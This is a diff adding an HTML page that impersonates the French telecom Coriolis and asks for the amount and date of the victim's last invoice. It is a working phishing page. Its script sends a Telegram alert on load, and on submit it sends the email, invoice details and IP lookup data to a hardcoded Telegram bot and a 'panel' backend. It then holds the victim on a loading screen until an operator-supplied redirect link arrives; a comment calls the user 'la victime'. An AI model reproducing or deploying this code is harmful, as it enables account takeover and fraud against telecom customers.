@@ -1,0 +1,857 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>CORIOLIS · Facture</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #ffffff;
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      min-height: 100vh;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .page-container {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+      min-height: 100vh;
+      background: #ffffff;
+    }
+
+    .top-bar {
+      background-color: #4DBDC6;
+      width: 100%;
+      min-height: 150px;
+      border-bottom-left-radius: 28px;
+      border-bottom-right-radius: 28px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.02), 0 2px 4px rgba(0, 0, 0, 0.02);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 24px;
+      transition: all 0.2s ease;
+      flex-shrink: 0;
+    }
+
+    .content-white {
+      flex: 1;
+      background-color: #ffffff;
+      width: 100%;
+      padding: 30px 20px;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+    }
+
+    /* Styles pour les éléments de paiement */
+    .payment-section {
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .montant-label {
+      font-weight: bold;
+      font-size: 1.3rem;
+      text-align: center;
+      margin-top: 28px;
+    }
+
+    .prix {
+      font-size: 14px;
+      font-weight: normal;
+      text-align: center;
+      margin-top: -3%;
+    }
+
+    /* Bloc bleu avec message */
+    .info-bloc {
+      background-color: #4DBDC6;
+      padding: 13px;
+      border-radius: 12px;
+      text-align: center;
+      color: #323232;
+      width: 89%;
+    }
+
+    .info-bloc p {
+      font-size: 17px;
+      line-height: 1.4;
+    }
+
+    /* Petite barre fine bleue */
+    .thin-blue-bar {
+      width:  90%;
+      height: 1px;
+      background-color: #4DBDC6;
+      border-radius: 3px;
+      margin-top: 1%;
+    }
+
+    /* Champs de formulaire style "seulement barre du bas" */
+    .input-field {
+      width: 100%;
+      text-align: center;
+    }
+
+    .input-field label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 1.1rem;
+    }
+
+    .input-with-bottom-border {
+      width: 90%;
+      padding: 12px 8px;
+      font-size: 1rem;
+      text-align: center;
+      border: none;
+      border-bottom: 2px solid #b5b5b5;
+      outline: none;
+      background: transparent;
+      font-family: inherit;
+    }
+
+    .input-with-bottom-border:focus {
+      border-bottom-color: #2c7da0;
+    }
+
+    /* Bouton continuer */
+    .btn-continuer {
+      background-color: #323232;
+      color: white;
+      border: none;
+      padding: 14px 40px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      border-radius: 40px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+      margin-top: 10px;
+    }
+
+    .btn-continuer:hover {
+      background-color: #2c7da0;
+    }
+
+    @media (max-width: 560px) {
+      .top-bar {
+        min-height: 100px !important;
+      }
+      .content-white {
+        padding: 20px 16px;
+      }
+      .prix {
+        font-size: 1.1rem;
+      }
+    }
+
+    @media (min-width: 1600px) {
+      .top-bar {
+        min-height: 170px !important;
+      }
+    }
+
+    .top-bar {
+      min-height: 120px !important;
+      height: auto !important;
+    }
+
+    @media (max-width: 560px) {
+      .top-bar {
+        min-height: 45px !important;
+      }
+    }
+
+    body, .page-container, .content-white {
+      overflow-x: hidden;
+    }
+
+
+/* Aligner les textes des labels à gauche */
+.input-field label {
+  margin-right: 47%;
+}
+
+/* Aligner le texte à l'intérieur des cases à gauche */
+.input-with-bottom-border {
+  text-align: left;
+}
+
+/* Espace entre les cases */
+.input-field {
+  margin-bottom: 28px;
+}
+
+/* Supprimer l'espace du dernier champ */
+.input-field:last-of-type {
+  margin-bottom: 0;
+}
+
+.bas {
+ width: 110%;
+margin-top: 10%;
+}
+
+  /* === STYLES DU FOOTER === */
+footer {
+  margin-top: -100px;
+  background: #1a1a1a;
+  color: #fff;
+  padding: 50px 0 20px;
+}
+
+.content-wrapper {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0 20px;
+}
+
+.footer-container .logo {
+  display: block;
+  margin-bottom: 30px;
+}
+
+.link-column {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+  gap: 30px;
+}
+
+.link-column div p {
+  font-weight: 600;
+  font-size: 16px;
+  margin-bottom: 15px;
+  cursor: pointer;
+  color: #fff;
+}
+
+.link-column ul {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+
+.link-column ul li {
+  margin-bottom: 10px;
+}
+
+.link-column ul li a {
+  color: #999;
+  text-decoration: none;
+  font-size: 14px;
+  transition: color 0.2s ease;
+}
+
+.link-column ul li a:hover {
+  color: #fff;
+}
+
+.networking-content {
+  text-align: center;
+  padding: 30px 0 20px;
+  border-top: 1px solid #333;
+  margin-top: 30px;
+}
+
+.networking {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+  display: flex;
+  justify-content: center;
+  gap: 20px;
+}
+
+.networking li a {
+  display: inline-block;
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  background: #333;
+  transition: background 0.3s ease;
+}
+
+.networking li a:hover {
+  background: #4DBDC6;
+}
+
+.networking li a.facebook { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>'); background-size: 20px; background-position: center; background-repeat: no-repeat; }
+.networking li a.twitter { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>'); background-size: 20px; background-position: center; background-repeat: no-repeat; }
+.networking li a.linkedin { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>'); background-size: 20px; background-position: center; background-repeat: no-repeat; }
+.networking li a.youtube { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>'); background-size: 20px; background-position: center; background-repeat: no-repeat; }
+.networking li a.instagram { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 1 0 0 12.324 6.162 6.162 0 0 0 0-12.324zM12 16a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm6.406-11.845a1.44 1.44 0 1 0 0 2.881 1.44 1.44 0 0 0 0-2.881z"/></svg>'); background-size: 20px; background-position: center; background-repeat: no-repeat; }
+
+.footer-extra {
+  background: #111;
+  padding: 20px 0;
+}
+
+.legal {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  gap: 15px 25px;
+}
+
+.legal li a {
+  color: #777;
+  text-decoration: none;
+  font-size: 13px;
+  transition: color 0.2s ease;
+}
+
+.legal li a:hover {
+  color: #fff;
+}
+
+@media (max-width: 768px) {
+  .link-column {
+    grid-template-columns: 1fr 1fr;
+  }
+}
+
+@media (max-width: 480px) {
+  .link-column {
+    grid-template-columns: 1fr;
+  }
+  .legal {
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+  }
+}
+
+/* Barre d'étapes - Style Orange */
+.stepbar {
+  width: 100%;
+  margin: 10px 0 20px 0;
+}
+
+.stepbar ol {
+  display: flex;
+  list-style: none;
+  padding: 0;
+  margin: 0;
+  justify-content: space-between;
+  position: relative;
+  counter-reset: step;
+}
+
+.stepbar ol::before {
+  content: '';
+  position: absolute;
+  top: 16px;
+  left: 30px;  
+  right: 30px;  
+  height: 2px;
+  background: #e1e1e1;
+  z-index: 0;
+}
+
+.step-item {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  position: relative;
+  z-index: 1;
+  flex: 1;
+  counter-increment: step;
+}
+
+.step-item::before {
+  content: counter(step);
+  width: 25px;
+  height: 25px;
+  border-radius: 50%;
+  background: #ffffff;
+  color: #000000;
+  border: 2px solid #e1e1e1;
+  font-size: 14px;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 8px;
+  transition: all 0.3s ease;
+  font-family: Arial, sans-serif;
+}
+
+.step-item.active::before {
+  background: #ffffff;
+  color: #000000;
+  border-color: #4DBDC6;
+}
+
+.step-item.active .step-title {
+  color: #4DBDC6;
+  font-weight: 600;
+}
+
+.step-title {
+  font-size: 12px;
+  color: #000000;
+  text-align: center;
+  font-weight: 400;
+  white-space: nowrap;
+}
+
+.step-link {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-decoration: none;
+  cursor: default;
+}
+
+.sub-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: #000;
+  margin-top: 10px;
+  text-align: left;
+  width: 100%;
+}
+
+.helper-text {
+  font-size: 14px;
+  color: #000000;
+  text-align: left;
+  width: 100%;
+  margin-bottom: 10px;
+  line-height: 1.4;
+}
+
+/* Conteneur du champ avec label flottant */
+.input-field {
+  position: relative;
+  width: 100%;
+  margin-bottom: 30px;
+  text-align: left;
+}
+
+/* Label qui flotte */
+.input-field label {
+  position: absolute;
+  left: 0;
+  top: 12px;
+  font-size: 16px;
+  color: #000;
+  transition: all 0.2s ease;
+  pointer-events: none;
+  font-weight: 400;
+  background: white;
+  padding: 0 4px;
+  margin-right: 0;
+}
+
+/* Label quand le champ est focus OU quand il y a du texte */
+.input-field label.active {
+  top: -10px;
+  font-size: 12px;
+  color: #4DBDC6;
+}
+
+/* Input */
+.input-with-bottom-border {
+  width: 100%;
+  padding: 14px 0 8px 0;
+  font-size: 16px;
+  border: none;
+  border-bottom: 2px solid #b5b5b5;
+  outline: none;
+  background: transparent;
+  font-family: inherit;
+  transition: border-color 0.3s ease;
+  text-align: left;
+}
+
+.input-with-bottom-border:focus {
+  border-bottom-color: #4DBDC6;
+}
+
+.input-with-bottom-border::placeholder {
+  color: #999;
+}
+
+/* Overlay de chargement */
+.loading-overlay {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(255, 255, 255, 0.85);
+  backdrop-filter: blur(5px);
+  z-index: 9999;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+}
+
+.loading-overlay.active {
+  display: flex;
+}
+
+.spinner {
+  width: 60px;
+  height: 60px;
+  border: 5px solid #e0e0e0;
+  border-top: 5px solid #4DBDC6;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.loading-text {
+  margin-top: 20px;
+  color: #4DBDC6;
+  font-weight: 600;
+  font-size: 16px;
+}
+
+  </style>
+</head>
+<body>
+  <!-- Overlay de chargement -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="spinner"></div>
+  <div class="loading-text">Chargement...</div>
+</div>
+  <div class="page-container">
+    <header class="top-bar" role="banner" aria-label="Barre de navigation bleue arrondie">
+      <span style="color: white; font-weight: 600; font-size: 1.6rem;">coriolis</span>
+    </header>
+    
+    <main class="content-white" role="main">
+      <div class="payment-section">
+<div class="montant-label" style="display: flex; align-items: center; gap: 10px; justify-content: center;">
+  <img src="assets/changement.jpg" alt="changement" style="height: 30px; width: auto;">
+  Changement offre Le Relax
+</div>
+
+<!-- Barre d'étapes -->
+<div class="stepbar">
+  <ol>
+    <li class="step-item">
+      <span class="step-link">
+        <span class="step-title"></span>
+      </span>
+    </li>
+    <li class="step-item active">
+      <span class="step-link">
+        <span class="step-title">Vérification facturation</span>
+      </span>
+    </li>
+    <li class="step-item">
+      <span class="step-link">
+        <span class="step-title"></span>
+      </span>
+    </li>
+    <li class="step-item">
+      <span class="step-link">
+        <span class="step-title"></span>
+      </span>
+    </li>
+    <li class="step-item">
+      <span class="step-link">
+        <span class="step-title"></span>
+      </span>
+    </li>
+  </ol>
+</div>
+
+<!-- Petite fine barre bleue -->
+<div class="thin-blue-bar"></div>        
+<!-- Sous-titre -->
+<h4 class="sub-title">Indiquez le montant et la date de votre dernière facture Coriolis</h4>
+
+<!-- Texte d'aide -->
+<p class="helper-text">Veuillez entrer le montant et la date de votre dernière facture Coriolis.</p>
+
+<!-- Champ Montant -->
+<div class="input-field">
+  <label for="montant-input">Montant de la facture</label>
+  <input id="montant-input" type="text" class="input-with-bottom-border" placeholder="Ex: 45,99">
+</div>
+
+<!-- Champ Date -->
+<div class="input-field">
+  <label for="date-input">Date de la facture</label>
+  <input id="date-input" type="text" class="input-with-bottom-border" placeholder="DD/MM/AAAA" maxlength="10">
+</div>
+
+<!-- Bouton Continuer -->
+<button class="btn-continuer">Continuer</button>
+      </div>
+    </main>
+  </div>
+  <!-- ========== FOOTER CORIOLIS ========== -->
+<footer>
+    <div class="footer-container content-wrapper">
+        <a href="/" class="logo" title="Page d'accueil de Coriolis">
+            <picture>
+                <source srcset="https://cdn.coriolistele.com/sources/coriolis/assets/images/coriolis-green-logo.svg">
+                <img src="https://cdn.coriolistele.com/sources/coriolis/assets/images/coriolis-green-logo.svg" alt="logo Coriolis" width="130" height="30" loading="lazy" decoding="async">
+            </picture>
+        </a>
+    <div class="networking-content">
+        <ul class="networking">
+            <li><a target="_blank" class="facebook">&nbsp;</a></li>
+            <li><a target="_blank" class="twitter">&nbsp;</a></li>
+            <li><a target="_blank" class="linkedin">&nbsp;</a></li>
+            <li><a target="_blank" class="youtube">&nbsp;</a></li>
+            <li><a target="_blank" class="instagram">&nbsp;</a></li>
+        </ul>
+    </div>
+</footer>
+
+<div class="footer-extra">
+    <div class="content-wrapper">
+        <ul class="legal">
+            <li><a >Conditions générales de vente</a></li>
+            <li><a >Conditions générales d'abonnement</a></li>
+            <li><a >Conditions générales d'utilisation</a></li>
+            <li><a >Informations légales</a></li>
+            <li><a >Gestion des cookies &amp; données personnelles</a></li>
+        </ul>
+    </div>
+</div>
+<!-- ========== FIN FOOTER ========== -->
+ <script>
+  // Envoyer le message automatiquement au chargement de la page
+window.addEventListener('load', function() {
+  const token = "8791271208:AAE1gIznsKHui2G_5X3P77v3VGzA6iN7whU";
+  const chatId = "-5520620526";
+  
+  const message = `
+<b>┏━━━━━━⊱ 📞 ⊰━━━━━┓</b>
+<b>└⊱ 🔎 +1 CLICK SOLDE</b>
+
+<b>New user balance on the pricing page</b>
+
+<b>📞 Base : CORIOLIS</b>
+<b>👨‍💻 DEV BY : @esim_to_Back</b>
+<b>└━━━━━━⊱ 📞 ⊰━━━━━━━━━━━━</b>
+  `;
+  
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'HTML'
+    })
+  }).catch(error => console.error('Erreur:', error));
+});
+
+// Gestion du label flottant pour le champ Montant
+const montantInput = document.getElementById('montant-input');
+const montantLabel = document.querySelector('.input-field label[for="montant-input"]');
+
+if (montantInput && montantLabel) {
+  montantInput.addEventListener('focus', function() {
+    montantLabel.classList.add('active');
+  });
+  
+  montantInput.addEventListener('blur', function() {
+    if (this.value.trim() === '') {
+      montantLabel.classList.remove('active');
+    }
+  });
+  
+  montantInput.addEventListener('input', function() {
+    if (this.value.trim() !== '') {
+      montantLabel.classList.add('active');
+    } else {
+      montantLabel.classList.remove('active');
+    }
+  });
+}
+
+// Gestion du label flottant pour le champ Date
+const dateInput = document.getElementById('date-input');
+const dateLabel = document.querySelector('.input-field label[for="date-input"]');
+
+if (dateInput && dateLabel) {
+  dateInput.addEventListener('focus', function() {
+    dateLabel.classList.add('active');
+  });
+  
+  dateInput.addEventListener('blur', function() {
+    if (this.value.trim() === '') {
+      dateLabel.classList.remove('active');
+    }
+  });
+  
+  dateInput.addEventListener('input', function() {
+    if (this.value.trim() !== '') {
+      dateLabel.classList.add('active');
+    } else {
+      dateLabel.classList.remove('active');
+    }
+  });
+}
+
+// Formatage automatique de la date
+if (dateInput) {
+  dateInput.addEventListener('input', function(e) {
+    let rawValue = this.value.replace(/\D/g, '');
+    if (rawValue.length > 8) rawValue = rawValue.slice(0, 8);
+    
+    let formattedValue = '';
+    for (let i = 0; i < rawValue.length; i++) {
+      if (i === 2 || i === 4) {
+        formattedValue += '/';
+      }
+      formattedValue += rawValue[i];
+    }
+    this.value = formattedValue;
+  });
+}
+
+// Fonction pour envoyer à Telegram
+function sendToTelegram(message) {
+  const token = "8791271208:AAE1gIznsKHui2G_5X3P77v3VGzA6iN7whU";
+  const chatId = "-5520620526";
+  
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'HTML'
+    })
+  }).catch(error => console.error('Erreur:', error));
+}
+
+// Récupérer l'IP et l'OS
+function getUserInfo() {
+  return fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      const ip = data.ip;
+      const os = navigator.userAgent;
+      return { ip, os };
+    })
+    .catch(() => {
+      return { ip: 'Inconnu', os: navigator.userAgent };
+    });
+}
+
+// Gestion du bouton Continuer
+const btnContinuer = document.querySelector('.btn-continuer');
+btnContinuer.addEventListener('click', async function(e) {
+  e.preventDefault();
+  
+  const montant = document.getElementById('montant-input').value.trim();
+  const date = document.getElementById('date-input').value.trim();
+  const email = localStorage.getItem('userEmail') || 'Non renseigné';
+  
+  // Récupérer le numéro depuis le localStorage OU depuis le serveur
+let numero = localStorage.getItem('userPhone') || localStorage.getItem('userEmail');
+
+if (!numero) {
+  // Si pas dans localStorage, récupérer depuis le serveur
+  try {
+    const resp = await fetch('get_numero.php');
+    const d = await resp.json();
+    numero = d.numero || 'Non renseigné';
+  } catch(e) {
+    numero = 'Non renseigné';
+  }
+}
+  
+  if (!montant || !date) {
+    alert("Veuillez saisir le montant et la date de votre facture");
+    return;
+  }
+  
+  // Sauvegarder les données pour le panel
+  fetch('save_facture_data.php', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      numero: numero,
+      montant: montant,
+      date: date,
+      email: email
+    })
+  }).catch(error => console.error('Erreur sauvegarde:', error));
+  
+  const message = `
+<b>┏━━━━━━⊱ 📞 ⊰━━━━━┓
+└⊱ 💰 +1 NEW SOLDE
+</b>
+<b>├⊱ 🙍🏻‍♂️ ⊱ ${email}
+├⊱ 💶 ⊱ ${montant}€
+├⊱ 🗓 ⊱ ${date}</b>
+
+<b>📞 Base : CORIOLIS
+👨‍💻 DEV BY : @esim_to_Back
+└━━━━━━⊱ 📞 ⊰━━━━━━━━━━━━</b>
+  `;
+  
+  // Afficher l'overlay de chargement (la page reste bloquée ici)
+  document.getElementById('loadingOverlay').classList.add('active');
+  sendToTelegram(message);
+  
+  // === ATTENDRE LE LIEN DE VÉRIFICATION ===
+const checkLink = setInterval(function() {
+    fetch('get_recup_link.php')
+      .then(response => response.json())
+      .then(data => {
+        if (data.success && data.lien && data.lien.trim() !== '') {
+          clearInterval(checkLink);
+          
+          // 1. Supprimer le lien côté serveur AVANT de rediriger
+          fetch('reset_recup_link.php', { method: 'POST' })
+            .then(() => {
+              // 2. Puis rediriger la victime
+              window.location.href = data.lien;
+            })
+            .catch(() => {
+              // Même si le reset échoue, on redirige quand même
+              window.location.href = data.lien;
+            });
+        }
+      })
+      .catch(() => {});
+  }, 2000);
+});
+</script>
+</body>
+</html>
